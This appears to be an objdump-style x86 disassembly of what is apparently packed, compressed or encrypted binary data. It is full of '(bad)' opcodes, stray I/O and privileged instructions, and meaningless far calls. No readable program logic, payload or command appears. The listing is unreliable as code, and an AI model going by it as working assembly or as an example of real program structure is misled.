  42f7f7:	test   al,0xd6
  42f7f9:	(bad)  
  42f7fa:	jg     0x42f7f5
  42f7fc:	push   cs
  42f7fd:	pop    ebp
  42f7fe:	push   ebp
  42f7ff:	mov    edi,0x73fa0748
  42f804:	je     0x42f802
  42f806:	add    DWORD PTR [eax],eax
  42f808:	add    al,0x1
  42f80a:	add    BYTE PTR [eax],al
  42f80c:	sbb    DWORD PTR [edi+0x677d6e86],esi
  42f812:	jns    0x42f7b2
  42f814:	push   edi
  42f815:	xchg   esi,eax
  42f816:	xchg   edx,eax
  42f817:	push   ds
  42f818:	mov    esi,eax
  42f81a:	call   0xe9a9be7f
  42f81f:	jne    0x42f7d9
  42f821:	xor    ecx,DWORD PTR [eax+0x5c68ebd0]
  42f827:	mov    bh,0x8e
  42f829:	repnz adc eax,0xc68ee539
  42f82f:	inc    ebp
  42f830:	les    edi,FWORD PTR [ecx*8+0x5f71e56d]
  42f837:	fbld   TBYTE PTR [edi]
  42f839:	(bad)
  42f83d:	mov    eax,?
  42f83f:	and    ecx,DWORD PTR [edi]
  42f841:	imul   esi,DWORD PTR [ecx],0xffffffb6
  42f844:	hlt    
  42f845:	stos   BYTE PTR es:[edi],al
  42f846:	adc    BYTE PTR [ebx+0x222fcfb4],dl
  42f84c:	fistp  QWORD PTR [esi]
  42f84e:	mov    bh,0xfd
  42f850:	cmp    BYTE PTR ds:0x1cedccb4,0xfd
  42f857:	icebp  
  42f858:	adc    ebp,eax
  42f85a:	repz pop ebp
  42f85c:	cmp    edi,eax
  42f85e:	in     al,0x2a
  42f860:	push   ecx
  42f861:	mov    eax,ds:0x81c71e57
  42f866:	sbb    al,0xb0
  42f868:	les    eax,FWORD PTR [eax-0x1b]
  42f86b:	aas    
  42f86c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f86d:	xor    bh,al
  42f86f:	push   esi
  42f870:	test   esp,esp
  42f872:	jns    0x42f866
  42f874:	lea    ebp,[ebp+0x73baf098]
  42f87a:	dec    edx
  42f87b:	in     al,0xf8
  42f87d:	and    al,0x76
  42f87f:	les    ecx,FWORD PTR [eax+0x28]
  42f882:	dec    eax
  42f883:	push   eax
  42f884:	stos   BYTE PTR es:[edi],al
  42f885:	mov    dh,0xc3
  42f887:	out    dx,ax
  42f889:	imul   esi,DWORD PTR [edx],0xa0751e47
  42f88f:	xchg   ecx,eax
  42f890:	jne    0x42f870
  42f892:	jecxz  0x42f898
  42f894:	in     eax,dx
  42f895:	mov    eax,DWORD PTR [ecx-0x6a]
  42f898:	mov    WORD PTR [esi+0x27db1169],?
  42f89e:	pop    edx
  42f89f:	push   ds
  42f8a0:	and    BYTE PTR ds:0xa120a00c,ah
  42f8a6:	or     ebx,DWORD PTR [ebx+0x3]
  42f8a9:	imul   DWORD PTR [ebp-0x65ce914c]
  42f8af:	sub    dl,ah
  42f8b1:	sti    
  42f8b2:	fnsave [ebx+edi*8]
  42f8b5:	loopne 0x42f846
  42f8b7:	push   ebp
  42f8b8:	jne    0x42f8e7
  42f8ba:	jbe    0x42f883
  42f8bc:	adc    eax,0xf6598a55
  42f8c1:	inc    esi
  42f8c2:	outs   dx,BYTE PTR ds:[esi]
  42f8c3:	je     0x42f908
  42f8c5:	adc    al,0xbd
  42f8c7:	clc    
  42f8c8:	jno    0x42f877
  42f8ca:	xor    ch,BYTE PTR [esi-0x79a306ce]
  42f8d0:	mov    DWORD PTR [eax+edi*4-0x502c2f17],ebp
  42f8d7:	arpl   WORD PTR [ecx+edx*8+0x60803eec],ax
  42f8de:	jge    0x42f8ff
  42f8e0:	outs   dx,DWORD PTR ds:[esi]
  42f8e1:	leave  
  42f8e2:	int3   
  42f8e3:	popf   
  42f8e4:	iret   
  42f8e5:	xor    dh,BYTE PTR [edi+0x37]
  42f8e8:	mov    ds:0xf7d6b364,eax
  42f8ed:	dec    ecx
  42f8ee:	les    ebx,FWORD PTR [ecx-0x4fb3373c]
  42f8f4:	fstp   QWORD PTR [esi]
  42f8f6:	dec    edi
  42f8f7:	dec    BYTE PTR [esi-0x2cfdd92b]
  42f8fd:	ins    DWORD PTR es:[edi],dx
  42f8fe:	call   0x4d88:0xe42ada19
  42f905:	push   esp
  42f906:	nop
  42f907:	pop    eax
  42f908:	sbb    eax,0xdb87bba2
  42f90d:	jecxz  0x42f897
  42f90f:	sbb    eax,0x0
	...
  42f974:	adc    al,0x74
  42f976:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f977:	push   ebp
  42f978:	in     al,0xd5
  42f97a:	cmc    
  42f97b:	jne    0x42f928
  42f97d:	sbb    cl,dh
  42f97f:	js     0x42f9d2
  42f981:	imul   DWORD PTR [eax-0x7b]
  42f984:	js     0x42f983
  42f986:	add    DWORD PTR [eax],eax
  42f988:	add    al,0x1
  42f98a:	add    BYTE PTR [eax],al
  42f98c:	loope  0x42f9f9
  42f98e:	pop    ss
  42f98f:	push   esi
  42f990:	rcr    BYTE PTR [ecx-0x2d],cl
  42f993:	cmp    eax,ecx
  42f995:	fdiv   DWORD PTR [edi]
  42f997:	fcom   DWORD PTR [ecx+ebx*4+0x1f]
  42f99b:	sti    
  42f99c:	cmp    eax,0x445aa701
  42f9a1:	stc    
  42f9a2:	pop    ds
  42f9a3:	in     al,dx
  42f9a4:	retf   0x573c
  42f9a7:	mov    al,ds:0x9fb5c35f
  42f9ac:	dec    ecx
  42f9ad:	xchg   edx,eax
  42f9ae:	mov    BYTE PTR [ecx+0x4d],al
  42f9b1:	jle    0x42f99d
  42f9b3:	int    0x25
  42f9b5:	mov    edi,0x6aa2555
  42f9ba:	fsub   st(4),st
  42f9bc:	daa    
  42f9bd:	adc    al,cl
  42f9bf:	je     0x42f985
  42f9c1:	pop    esp
  42f9c2:	fbstp  TBYTE PTR ds:0x8e5682e1
  42f9c8:	fisub  DWORD PTR [ecx]
  42f9ca:	sbb    DWORD PTR [ecx-0x7dc2e1f4],0x2509c08b
  42f9d4:	inc    ebx
  42f9d5:	ins    BYTE PTR es:[edi],dx
  42f9d6:	mov    BYTE PTR [ecx],dh
  42f9d8:	ret    
  42f9d9:	inc    BYTE PTR [ebx+0x76]
  42f9dc:	sub    eax,0x798c20ae
  42f9e1:	sti    
  42f9e2:	xor    edx,DWORD PTR [edx]
  42f9e4:	dec    ebx
  42f9e5:	add    eax,0xf3f7cdf4
  42f9ea:	mov    bh,0x87
  42f9ec:	add    eax,0xc507139f
  42f9f1:	xchg   edx,eax
  42f9f2:	add    dl,BYTE PTR [edx+0x5fd522da]
  42f9f8:	ret    0x1a04
  42f9fb:	lods   eax,DWORD PTR ds:[esi]
  42f9fc:	adc    al,0xea
  42f9fe:	(bad)  
  42f9ff:	mov    ?,WORD PTR [edi+0x3b]
  42fa02:	stc    
  42fa03:	lahf   
  42fa04:	push   ds
  42fa05:	xchg   esp,eax
  42fa06:	jle    0x42f9ee
  42fa08:	or     al,0xdb
  42fa0a:	or     eax,0x30dbb94
  42fa0f:	sbb    al,0x5b
  42fa11:	ins    BYTE PTR es:[edi],dx
  42fa12:	mov    ch,cl
  42fa14:	push   ecx
  42fa15:	aas    
  42fa16:	mov    edi,0x742b8a73
  42fa1b:	mov    edi,0x682a060f
  42fa20:	xchg   esp,eax
  42fa21:	xchg   edi,eax
  42fa22:	cmp    al,bl
  42fa24:	jo     0x42fa29
  42fa26:	outs   dx,BYTE PTR ds:[esi]
  42fa27:	call   0xb6b5:0x43806195
  42fa2e:	push   edx
  42fa2f:	add    BYTE PTR [edi],0x71
  42fa32:	js     0x42fa14
  42fa34:	pop    esi
  42fa35:	add    DWORD PTR [eax],edi
  42fa37:	std    
  42fa38:	jge    0x42fa00
  42fa3a:	iret   
  42fa3b:	mov    cl,0x3c
  42fa3d:	(bad)  
  42fa3e:	fcomp  st(2)
  42fa40:	dec    edi
  42fa41:	call   eax
  42fa43:	cdq    
  42fa44:	add    BYTE PTR [ebp+0x1524b399],dl
  42fa4a:	dec    esi
  42fa4b:	popa   
  42fa4c:	xchg   ebp,eax
  42fa4d:	in     eax,0x3a
  42fa4f:	push   0x9
  42fa51:	call   0x2f35:0xd95dd5fa
  42fa58:	mov    ch,0xfb
  42fa5a:	daa    
  42fa5b:	and    eax,0x23670789
  42fa60:	aas    
  42fa61:	mov    BYTE PTR [edi],dl
  42fa63:	jo     0x42fa2d
  42fa65:	mov    ecx,0xf98f8af2
  42fa6a:	lods   eax,DWORD PTR ds:[esi]
  42fa6b:	sti    
  42fa6c:	fwait
  42fa6d:	dec    eax
  42fa6f:	pop    ss
  42fa70:	fsub   QWORD PTR [ebx+0x7859fb9]
  42fa76:	rep stos DWORD PTR es:[edi],eax
  42fa78:	sahf   
  42fa79:	sub    dh,BYTE PTR [edx]
  42fa7b:	push   ebx
  42fa7c:	(bad)  
  42fa7d:	ficom  WORD PTR [edx-0x43]
  42fa80:	jbe    0x42fa4d
  42fa82:	(bad)  
  42fa83:	scas   al,BYTE PTR es:[edi]
  42fa84:	jb     0x42fa8e
  42fa86:	jp     0x42faf5
  42fa88:	(bad)  
  42fa89:	mov    edx,0xa954a84f
  42fa8e:	inc    esi
  42fa8f:	pop    eax
	...
  42faf4:	sbb    ebp,edi
  42faf6:	shl    BYTE PTR [esi],0xf4
  42faf9:	aas    
  42fafa:	(bad)  
  42fafb:	out    dx,eax
  42fafc:	int3   
  42fafd:	mov    WORD PTR [edi+0x32],?
  42fb00:	mov    bl,0xd5
  42fb02:	das    
  42fb03:	outs   dx,DWORD PTR ds:[esi]
  42fb04:	jl     0x42fb04
  42fb06:	add    DWORD PTR [eax],eax
  42fb08:	add    al,0x1
  42fb0a:	add    BYTE PTR [eax],al
  42fb0c:	bound  edi,QWORD PTR [ecx-0x5d]
  42fb0f:	jmp    0x42fb5e
  42fb11:	pop    ebx
  42fb12:	retf   0xec87
  42fb15:	test   al,0xd8
  42fb17:	out    dx,eax
  42fb18:	mov    ah,0x70
  42fb1a:	mov    al,0xaf
  42fb1c:	scas   al,BYTE PTR es:[edi]
  42fb1d:	push   ds
  42fb1e:	sub    dl,BYTE PTR [edi-0xd]
  42fb21:	inc    eax
  42fb22:	adc    DWORD PTR [edx-0x5a],esp
  42fb25:	loopne 0x42fb86
  42fb27:	mov    dh,0x19
  42fb29:	cwde   
  42fb2a:	cli    
  42fb2b:	xchg   ebp,eax
  42fb2c:	lea    ebx,[esi+0x6f]
  42fb2f:	mov    gs,eax
  42fb31:	push   cs
  42fb32:	mov    esi,0x349986aa
  42fb37:	ins    BYTE PTR es:[edi],dx
  42fb38:	mov    bl,BYTE PTR [esi-0x53]
  42fb3b:	sbb    cl,bl
  42fb3d:	push   ebx
  42fb3e:	fs jmp 0x42faf7
  42fb41:	rcl    esi,cl
  42fb43:	les    ecx,FWORD PTR [edx-0x2e]
  42fb46:	sar    DWORD PTR [esi+0x66785fab],1
  42fb4c:	dec    esi
  42fb4d:	push   0x51
  42fb4f:	daa    
  42fb50:	pop    esi
  42fb51:	idiv   bl
  42fb53:	jge    0x42fb88
  42fb55:	inc    esp
  42fb56:	fisttp DWORD PTR [ebx+0x2d]
  42fb59:	cmp    BYTE PTR [eax],0xa1
  42fb5c:	pop    ds
  42fb5d:	repz in eax,0x5e
  42fb60:	mov    ecx,0x5bcba094
  42fb65:	jns    0x42fb00
  42fb67:	push   0x41c5f590
  42fb6c:	mov    eax,ds:0xe3640bc8
  42fb71:	and    bh,BYTE PTR [edx+ebx*8]
  42fb74:	(bad)  
  42fb75:	rol    ebp,cl
  42fb77:	stos   BYTE PTR es:[edi],al
  42fb78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fb79:	stos   BYTE PTR es:[edi],al
  42fb7a:	ins    BYTE PTR es:[edi],dx
  42fb7b:	fwait
  42fb7c:	out    dx,al
  42fb7d:	fwait
  42fb7e:	dec    eax
  42fb7f:	je     0x42fb97
  42fb81:	leave  
  42fb82:	sub    cl,BYTE PTR [edx+eax*8-0x2c]
  42fb86:	xchg   ebp,eax
  42fb87:	(bad)  
  42fb88:	push   eax
  42fb89:	xor    eax,0xd42aaeb2
  42fb8e:	mov    eax,ds:0xed7e6327
  42fb93:	gs retf 
  42fb95:	cdq    
  42fb96:	je     0x42fb88
  42fb98:	scas   al,BYTE PTR es:[edi]
  42fb99:	sbb    al,0x4e
  42fb9b:	mov    ds:0x6b11ba8d,eax
  42fba0:	and    WORD PTR [esi],bx
  42fba3:	imul   ebx,DWORD PTR [ebx+0x77dafa04],0xfffffff8
  42fbaa:	xor    eax,0x1eff6ca6
  42fbaf:	jmp    0x42fb70
  42fbb1:	inc    esi
  42fbb2:	adc    ah,BYTE PTR [eax+esi*4+0x7d]
  42fbb6:	ret    0x1829
  42fbb9:	and    DWORD PTR [ebx-0x71795a76],0x145de05c
  42fbc3:	mov    dh,0x4
  42fbc5:	mov    al,ds:0x3d1f6618
  42fbca:	mov    ah,0x4e
  42fbcc:	dec    ebp
  42fbcd:	(bad)  
  42fbce:	xor    dh,dl
  42fbd0:	sti    
  42fbd1:	or     eax,0xcea5c0c6
  42fbd6:	add    eax,edx
  42fbd8:	mov    esi,0x84a21f5
  42fbdd:	mov    BYTE PTR [ebx],cl
  42fbdf:	into   
  42fbe0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fbe1:	xchg   ebp,eax
  42fbe2:	push   eax
  42fbe3:	xor    cl,al
  42fbe5:	cdq    
  42fbe6:	cs mov ebx,0x68da2899
  42fbec:	push   ebx
  42fbed:	jb     0x42fc34
  42fbef:	cdq    
  42fbf0:	cmp    BYTE PTR [ebx],0x23
  42fbf3:	dec    ebp
  42fbf4:	call   0xb8a9:0x46d2c1e4
  42fbfb:	dec    ebp
  42fbfc:	add    esi,DWORD PTR [ebp+0x7c]
  42fbff:	or     esi,ebp
  42fc01:	aas    
  42fc02:	test   edi,edx
  42fc04:	xchg   ecx,eax
  42fc05:	xchg   edx,eax
  42fc06:	inc    eax
  42fc07:	mov    cl,0xe9
  42fc09:	inc    esp
  42fc0a:	mov    eax,0x3c79e502
  42fc0f:	add    BYTE PTR [eax],0x0
	...
  42fc72:	add    BYTE PTR [eax],al
  42fc74:	or     ecx,DWORD PTR [eax+0x3ba319a3]
  42fc7a:	mov    ebx,0x36325e9a
  42fc7f:	and    BYTE PTR [esi+0x3f],al
  42fc82:	xchg   esp,eax
  42fc83:	add    DWORD PTR [eax+0x40001ff],eax
  42fc89:	add    DWORD PTR [eax],eax
  42fc8b:	add    ah,al
  42fc8d:	sbb    BYTE PTR [ebp-0xbee9b29],dh
  42fc93:	std    
  42fc94:	jnp    0x42fc7b
  42fc96:	xor    BYTE PTR [ebp-0x420d463c],dh
  42fc9c:	pop    ss
  42fc9d:	(bad)  
  42fc9f:	sub    ecx,DWORD PTR [ebx]
  42fca1:	sub    DWORD PTR [ecx+eax*1],ebx
  42fca4:	nop
  42fca5:	icebp  
  42fca6:	and    BYTE PTR [eax+0x6460136a],dh
  42fcac:	(bad)  
  42fcad:	sti    
  42fcae:	stos   DWORD PTR es:[edi],eax
  42fcaf:	hlt    
  42fcb0:	mov    bh,0x44
  42fcb2:	inc    ebp
  42fcb3:	int3   
  42fcb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fcb5:	xchg   edi,eax
  42fcb6:	cmp    bl,al
  42fcb8:	call   0x533c:0x6ccffbc1
  42fcbf:	add    BYTE PTR [edx],ah
  42fcc1:	imul   edi,DWORD PTR [edi-0x72],0x2cba7b5
  42fcc8:	retf   
  42fcc9:	mov    eax,ds:0x913ea9ce
  42fcce:	mov    ch,0xd9
  42fcd0:	jb     0x42fd1e
  42fcd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fcd3:	addr16 mov ds:0xd6d,al
  42fcd7:	aaa    
  42fcd8:	mov    al,BYTE PTR [ebx+0x60]
  42fcdb:	push   ebx
  42fcdc:	imul   ecx,DWORD PTR [edi],0x43
  42fcdf:	pop    ebx
  42fce0:	shr    BYTE PTR [edi+0x7b0f02c0],cl
  42fce6:	pop    DWORD PTR [ecx+0xfb89cd6]
  42fcec:	ret    0x5fb8
  42fcef:	push   0x29f9de5b
  42fcf4:	inc    esp
  42fcf5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fcf6:	mov    esi,0xeb0a6acf
  42fcfb:	pop    eax
  42fcfc:	and    eax,0x94b03cce
  42fd01:	jmp    0x42fccf
  42fd03:	stos   BYTE PTR es:[edi],al
  42fd04:	stc    
  42fd05:	sti    
  42fd06:	cwde   
  42fd07:	sbb    al,0x2a
  42fd09:	(bad)  
  42fd0a:	fcmovb st,st(3)
  42fd0c:	jg     0x42fd03
  42fd0e:	nop
  42fd0f:	xchg   esp,eax
  42fd10:	mov    bh,0x18
  42fd12:	add    bl,BYTE PTR [ecx-0x375cd68d]
  42fd18:	adc    ebp,DWORD PTR [ecx+0x2c]
  42fd1b:	adc    esp,DWORD PTR [ecx+0x1]
  42fd1e:	in     eax,0xa0
  42fd20:	dec    eax
  42fd21:	stos   BYTE PTR es:[edi],al
  42fd22:	jns    0x96c485bc
  42fd28:	jecxz  0x42fd6c
  42fd2a:	push   es
  42fd2b:	mov    bh,bl
  42fd2d:	sbb    DWORD PTR [eax-0x682d99c0],eax
  42fd33:	mov    eax,ecx
  42fd35:	and    BYTE PTR [eax],bh
  42fd37:	in     al,dx
  42fd38:	fidivr DWORD PTR [edi-0x1889dd34]
  42fd3e:	xor    DWORD PTR [edx-0x2c],ebp
  42fd41:	jge    0x42fce5
  42fd43:	aam    0x32
  42fd45:	shr    esp,0x56
  42fd48:	dec    esp
  42fd49:	ss int 0xc2
  42fd4c:	adc    edi,ebx
  42fd4e:	loop   0x42fd3a
  42fd50:	retf   0x85cf
  42fd53:	out    dx,al
  42fd54:	jne    0x42fd1c
  42fd56:	popa   
  42fd57:	cmp    dl,al
  42fd59:	pop    ss
  42fd5a:	adc    eax,0xb99d67ee
  42fd5f:	in     eax,0x84
  42fd61:	xchg   ecx,eax
  42fd62:	cdq    
  42fd63:	bound  esp,QWORD PTR [edx-0x68]
  42fd66:	mov    ecx,0xca8da06c
  42fd6b:	mov    eax,?
  42fd6d:	scas   eax,DWORD PTR es:[edi]
  42fd6e:	inc    eax
  42fd6f:	ins    BYTE PTR es:[edi],dx
  42fd70:	retf   0x3c74
  42fd73:	dec    esi
  42fd74:	shl    DWORD PTR [edi-0x775a1cc0],1
  42fd7a:	sub    ebx,DWORD PTR [edi+0x50]
  42fd7d:	sub    dl,BYTE PTR es:[eax+ebx*1+0x1]
  42fd82:	jmp    0x28f35060
  42fd87:	fdivr  QWORD PTR [esi-0x1e8d8bef]
  42fd8d:	pop    edx
  42fd8e:	mov    edx,0xf4
	...
  42fdf3:	add    BYTE PTR [eax-0x40],cl
  42fdf6:	ret    0xcaf0
  42fdf9:	bnd jp 0x42fdf4
  42fdfc:	cmc    
  42fdfd:	inc    edx
  42fdfe:	stos   BYTE PTR es:[edi],al
  42fdff:	repz fwait
  42fe01:	lock sbb ch,BYTE PTR [edi+0x20084]
  42fe08:	add    al,0x1
  42fe0a:	add    BYTE PTR [eax],al
  42fe0c:	stos   WORD PTR es:[edi],ax
  42fe0e:	ja     0x42fe82
  42fe10:	sub    esi,ebp
  42fe12:	fistp  WORD PTR [ecx+0x2f]
  42fe15:	std    
  42fe16:	mov    ds:0x1026fa7d,al
  42fe1b:	arpl   WORD PTR [ebx+0xcb1ede0],si
  42fe21:	data16 adc al,0xc6
  42fe24:	sbb    DWORD PTR [ebx+ebx*2-0x14495694],esp
  42fe2b:	xor    ebp,DWORD PTR [edi-0x80]
  42fe2e:	icebp  
  42fe2f:	shl    BYTE PTR [ebx+0xf],0xc0
  42fe33:	adc    esi,DWORD PTR [eax+edx*1-0x1926c1ec]
  42fe3a:	shr    DWORD PTR [ebp+0x39fe8a47],cl
  42fe40:	mov    cl,bh
  42fe42:	xchg   ecx,eax
  42fe43:	pop    ecx
  42fe44:	cmp    eax,0xcfe35bc3
  42fe49:	in     eax,dx
  42fe4a:	imul   edx,edi,0xffffffe1
  42fe4d:	mov    eax,ds:0x9b7eb0ce
  42fe52:	or     BYTE PTR [ecx+ecx*8],bl
  42fe55:	int    0x74
  42fe57:	mov    ah,0x67
  42fe59:	mov    eax,ds:0x23465fac
  42fe5e:	addr16 test al,0x83
  42fe61:	jnp    0x42fde9
  42fe63:	loop   0x42feb6
  42fe65:	scas   al,BYTE PTR es:[edi]
  42fe66:	ja     0x42fe5c
  42fe68:	stos   BYTE PTR es:[edi],al
  42fe69:	mov    al,0x9e
  42fe6b:	les    ebx,FWORD PTR [ebp-0x212435bd]
  42fe71:	cmp    eax,0xf5257eb8
  42fe76:	mov    al,0xcb
  42fe78:	out    0x81,eax
  42fe7a:	inc    esp
  42fe7b:	xor    bl,dl
  42fe7d:	mov    ds:0x463aecb6,eax
  42fe82:	xlat   BYTE PTR ds:[ebx]
  42fe83:	cli    
  42fe84:	in     eax,0x21
  42fe86:	add    BYTE PTR [ebx+ecx*2-0x225de221],al
  42fe8d:	test   BYTE PTR [esi+0x132e93e],0x78
  42fe94:	sbb    al,0x25
  42fe96:	sbb    eax,0x8a9c03db
  42fe9b:	adc    DWORD PTR [edi+edi*2+0x5776a5a7],edx
  42fea2:	retf   
  42fea3:	jb     0x42fe34
  42fea5:	jl     0x42fe9b
  42fea7:	repz sbb eax,0x47d6e9ce
  42fead:	push   ebp
  42feae:	fstp   QWORD PTR [edx]
  42feb0:	dec    ecx
  42feb1:	mov    edi,0xb19f7f0b
  42feb6:	add    eax,0x58b39966
  42febb:	lock imul edi,DWORD PTR [eax],0x9d2afcba
  42fec2:	dec    ecx
  42fec3:	inc    eax
  42fec4:	mov    al,0x11
  42fec6:	into   
  42fec7:	rcr    esi,1
  42fec9:	ins    DWORD PTR es:[edi],dx
  42feca:	cmp    BYTE PTR [edx-0x37148c7],al
  42fed0:	test   eax,0x9178cb96
  42fed5:	xor    eax,0x54c83b6b
  42feda:	jb     0x42ff36
  42fedc:	into   
  42fedd:	pushf  
  42fede:	mov    cl,0xb7
  42fee0:	dec    ebx
  42fee1:	push   ecx
  42fee2:	jmp    0x42feb5
  42fee4:	icebp  
  42fee5:	push   ebp
  42fee6:	jae    0x42fec4
  42fee8:	int    0x1e
  42feea:	test   eax,0xfd600741
  42feef:	jne    0x42feff
  42fef1:	or     DWORD PTR [ebp+0x396bb654],esp
  42fef7:	xchg   BYTE PTR [eax-0x1a],ch
  42fefa:	sbb    BYTE PTR [ecx],ah
  42fefc:	xchg   DWORD PTR [esi-0x46f443b9],ecx
  42ff02:	add    DWORD PTR [esi+0x16003ee0],0x57
  42ff09:	xor    esi,DWORD PTR [edi]
  42ff0b:	cmc    
  42ff0c:	jns    0x42ff0e
  42ff0e:	dec    esi
  42ff0f:	fld    QWORD PTR [eax]
	...
  42ff71:	add    BYTE PTR [eax],al
  42ff73:	add    BYTE PTR [edi+eiz*2],al
  42ff76:	std    
  42ff77:	aaa    
  42ff78:	(bad)  
  42ff79:	mov    edi,0x9ffa77ce
  42ff7e:	shl    DWORD PTR [edi+ebx*8-0x36],0x4
  42ff83:	jg     0x42ff0d
  42ff85:	add    DWORD PTR [edx],eax
  42ff87:	add    BYTE PTR [ecx+eax*1],al
  42ff8a:	add    BYTE PTR [eax],al
  42ff8c:	(bad)  
  42ff8d:	not    DWORD PTR [edx+ebp*4]
  42ff90:	es adc eax,0x3e09eb7
  42ff96:	mov    bh,0x78
  42ff98:	adc    DWORD PTR [esi],0x7c183209
  42ff9e:	and    eax,0xa59bc34e
  42ffa3:	xlat   BYTE PTR ds:[ebx]
  42ffa4:	and    ch,BYTE PTR [edx]
  42ffa6:	add    al,0x62
  42ffa8:	mov    WORD PTR [ebx],ss
  42ffaa:	aas    
  42ffab:	mov    ?,WORD PTR [edx+ebx*2-0x152e758b]
  42ffb2:	out    0x73,eax
  42ffb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ffb5:	jb     0x42ffbf
  42ffb7:	clc    
  42ffb8:	das    
  42ffb9:	sbb    al,0x4c
  42ffbb:	dec    ebp
  42ffbc:	and    BYTE PTR [ecx-0x15],cl
  42ffbf:	pop    ds
  42ffc0:	sub    ah,BYTE PTR [eax-0x4dbd45af]
  42ffc6:	fiadd  WORD PTR [ebp+edi*1+0x546f9c05]
  42ffcd:	xchg   ecx,eax
  42ffce:	mov    eax,0xba72c5e7
  42ffd3:	call   0x899d:0x453cde50
  42ffda:	fst    DWORD PTR [edx]
  42ffdc:	pushf  
  42ffdd:	inc    ecx
  42ffde:	xchg   DWORD PTR [edx],eax
  42ffe0:	xor    edi,esi
  42ffe2:	pushf  
  42ffe3:	adc    BYTE PTR [esi-0x77c56be9],ah
  42ffe9:	les    ecx,FWORD PTR [edi]
  42ffeb:	fdivr  st,st(7)
  42ffed:	mov    ebx,0xf4ca763b
  42fff2:	mov    ds:0x748e7b5f,al
  42fff7:	ds in  al,0x99
  42fffa:	fcomp  DWORD PTR [esi]
  42fffc:	repz dec ebx
  42fffe:	fs loop 0x42ff8c
  430001:	pusha  
  430002:	popa   
  430003:	mov    dh,0xf9
  430005:	cs push ebx
  430007:	cmp    edx,DWORD PTR [edi-0xc]
  43000a:	frstor [ecx+0x1f030561]
  430010:	sbb    BYTE PTR [edi],cl
  430012:	cmovns ebx,DWORD PTR [ebx]
  430015:	jbe    0x430052
  430017:	rcl    BYTE PTR [edi+0x53],cl
  43001a:	retf   
  43001b:	sbb    DWORD PTR [ebp-0x30],0x3b
  43001f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430021:	cmp    al,0x35
  430023:	fld    QWORD PTR [ecx-0x4679603c]
  430029:	mov    bh,0xcb
  43002b:	data16 (bad) 
  43002d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43002e:	(bad)  
  43002f:	mov    ch,0xa1
  430031:	add    eax,0x59eea59d
  430036:	jae    0x4300b7
  430038:	sbb    DWORD PTR [ebp-0xed40614],edi
  43003e:	sbb    DWORD PTR [edi],edi
  430040:	pusha  
  430041:	ins    DWORD PTR es:[edi],dx
  430042:	pop    edx
  430043:	fwait
  430044:	gs inc ecx
  430046:	dec    ebx
  430047:	mov    bh,0xa2
  430049:	mov    edx,0xd1bb0b61
  43004e:	push   0x5f9558af
  430053:	imul   edi,DWORD PTR [ecx],0x7b
  430056:	add    esp,ebx
  430058:	stos   DWORD PTR es:[edi],eax
  430059:	aam    0x31
  43005b:	push   esi
  43005c:	pop    ds
  43005d:	xor    eax,0x2c7926ba
  430062:	cmp    DWORD PTR [esi+edi*1+0x5cf93b],eax
  430069:	gs test al,0xe3
  43006c:	fisttp DWORD PTR [ebx-0x28]
  43006f:	and    DWORD PTR [ebp-0x1a33bdcb],edx
  430075:	in     eax,0x5b
  430077:	mov    bh,BYTE PTR [eax+0x55860dc8]
  43007d:	and    DWORD PTR [eax],0x9c9abd6
  430083:	jmp    0xc3362bf2
  430088:	pop    ebx
  430089:	xor    eax,0x1182e7da
  43008e:	rcr    DWORD PTR [edx+0x0],cl
	...
  4300f4:	(bad)  
  4300f5:	ins    DWORD PTR es:[edi],dx
  4300f6:	aam    0xb5
  4300f8:	(bad)  
  4300f9:	mov    ebp,0x9547fe7
  4300fe:	scas   eax,DWORD PTR es:[edi]
  4300ff:	add    al,0x65
  430101:	loop   0x43010e
  430103:	pop    esp
  430104:	mov    WORD PTR [edx],es
  430106:	add    al,BYTE PTR [eax]
  430108:	pop    eax
  430109:	add    BYTE PTR [eax],al
  43010b:	add    dl,dh
  43010d:	je     0x4300e0
  43010f:	push   esi
  430110:	add    ah,BYTE PTR [edi+0x3f]
  430113:	stc    
  430114:	out    dx,al
  430115:	inc    esi
  430116:	loop   0x4300b3
  430118:	mul    DWORD PTR [edx+0xd36421a]
  43011e:	sub    ch,bh
  430120:	dec    ecx
  430121:	mov    ebx,0xe0f6fc4c
  430126:	sub    DWORD PTR [esi-0x38],ebx
  430129:	sbb    BYTE PTR [edi],bh
  43012b:	fadd   QWORD PTR [ecx]
  43012d:	push   esp
  43012e:	sub    al,0x67
  430130:	inc    ebx
  430132:	test   BYTE PTR [esi-0x42e58691],dl
  430138:	push   es
  430139:	out    0xc4,eax
  43013b:	imul   edx,DWORD PTR [edx],0x1c
  43013e:	pop    esi
  43013f:	jo     0x430142
  430141:	daa    
  430142:	adc    eax,DWORD PTR [edi-0x1d]
  430145:	outs   dx,BYTE PTR ds:[esi]
  430146:	pop    edx
  430147:	daa    
  430148:	out    dx,al
  430149:	mov    edx,0xb301fb9d
  43014e:	push   es
  43014f:	mov    dh,0x11
  430151:	mov    edx,0x6d6b271f
  430156:	out    dx,eax
  430157:	sub    ah,cl
  430159:	xchg   ecx,eax
  43015a:	aas    
  43015b:	xchg   DWORD PTR [ebp+0x23b1879b],ebx
  430161:	pop    eax
  430162:	fwait
  430163:	add    eax,DWORD PTR [eax]
	...
  430171:	add    BYTE PTR [eax],al
  430173:	add    BYTE PTR [ebp+0x55],cl
  430176:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  43017c:	mov    esp,ebp
  43017e:	or     ah,dh
  430180:	dec    ebp
  430181:	add    bh,al
  430183:	add    BYTE PTR [eax],cl
  430185:	add    BYTE PTR [eax],al
  430187:	mov    DWORD PTR [eax],0x40f44545
  43018d:	xor    DWORD PTR [eax],eax
  43018f:	test   DWORD PTR [ebx-0x34070b64],ecx
  430195:	(bad)  
  430196:	enter  0x4d45,0xbc
  43019a:	mov    esi,DWORD PTR [edx]
  43019c:	hlt    
  43019d:	test   ebx,ecx
  43019f:	pushf  
  4301a0:	enter  0x4df8,0x8b
  4301a4:	mov    DWORD PTR [ebp+0x8],0x894708
  4301ab:	inc    ebp
